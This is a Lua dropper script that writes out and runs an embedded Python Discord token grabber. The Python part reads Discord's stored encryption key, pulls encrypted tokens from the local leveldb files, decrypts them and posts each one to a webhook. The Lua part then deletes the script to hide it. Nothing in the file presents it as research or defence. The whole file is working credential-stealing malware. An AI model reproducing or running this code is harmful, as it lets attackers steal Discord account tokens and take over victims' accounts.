local appDataPath = os.getenv("APPDATA")

local pythonScript = [[
import os
import json
import base64
import re
import win32crypt
import requests
from Crypto.Cipher import AES

WEBHOOK_URL = ""

def getkey(path):
    with open(path + "\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def send_to_webhook(token):
    data = {
        "content": f"Decrypted Token: {token}"
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Successfully sent to webhook.")
        else:
            print(f"Failed to send to webhook. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending to webhook: {e}")

def decrypt_token(path):
    for token in gettokens(path):
        token = token.replace("\\", "") if token.endswith("\\") else token
        
        try:
            token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
            send_to_webhook(token)
        except Exception as e:
            print(f"Error decrypting token: {e}")

def main():
    ROAMING = os.getenv("APPDATA")
    DISCORD_PATH = ROAMING + '\\discord'

    if not os.path.exists(DISCORD_PATH):
        print("Discord path not found.")
        return

    decrypt_token(DISCORD_PATH)

if __name__ == "__main__":
    main()
]]

local pythonScriptPath = appDataPath .. "\\test.py"

local file = io.open(pythonScriptPath, "w")
if file then
    file:write(pythonScript)
    file:close()
    print("Python script created successfully.")
else
    print("Failed to create Python script.")
end

local pipInstallCmds = {
    "pip install pywin32",
    "pip install pycryptodome",
    "pip install requests"
}

for _, cmd in ipairs(pipInstallCmds) do
    print("Running command: " .. cmd)
    os.execute(cmd)
end

os.execute("timeout /t 3 >nul")

os.execute('python "' .. pythonScriptPath .. '"')

os.execute("timeout /t 3 >nul")

os.remove(pythonScriptPath)
print("Python script removed.")